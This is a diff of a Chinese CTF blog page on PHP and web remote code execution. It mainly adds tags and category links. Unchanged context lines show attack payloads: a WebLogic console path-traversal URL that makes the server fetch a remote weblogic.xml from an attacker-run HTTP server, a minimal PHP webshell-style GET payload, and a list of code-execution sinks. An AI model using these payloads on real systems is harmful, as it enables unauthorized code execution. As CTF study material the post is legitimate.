@@ -27,8 +27,9 @@
 <meta property="og:description" content="代码执行eval() assert()  preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换 create_function  动态调用：变量当做函数用 回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’] call_user_func_array(a,b) b是数">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-09-01T06:42:00.000Z">
-<meta property="article:modified_time" content="2024-09-01T08:53:42.272Z">
+<meta property="article:modified_time" content="2024-09-03T10:00:00.607Z">
 <meta property="article:author" content="uert">
+<meta property="article:tag" content="web rce">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -820,7 +821,7 @@ $_=[];$_=@&quot;$_&quot;; $_=$_[&#39;!&#39;==&#39;@&#39;]; $___=$_; $__=$_;$__++
 <li>接着访问<code>http://IP:PORT/console/css/%252e%252e%252fconsole.portal</code>（这里最好抓包修改）</li>
 <li>接着在本地用python起一个HTTP服务，HTTP下放置weblogic.xml</li>
 <li><pre><code class="python">python3 -m http.server 8001
-
+  
       接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8001/weblogic.xml&quot;)`
       短rce？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
           形如`$&#123;_GET&#125;&#123;%f8&#125;();&amp;%f8=cmd`的payload需要的代码量最少且功能齐全，
@@ -837,6 +838,41 @@ $_=[];$_=@&quot;$_&quot;; $_=$_[&#39;!&#39;==&#39;@&#39;]; $___=$_; $__=$_;$__++
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF-web/" class="category-chain-item">CTF-web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF-web/rce/" class="category-chain-item">rce</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web-rce/" class="print-no-link">#web rce</a>
+      
+    </div>
   
 </div>
 
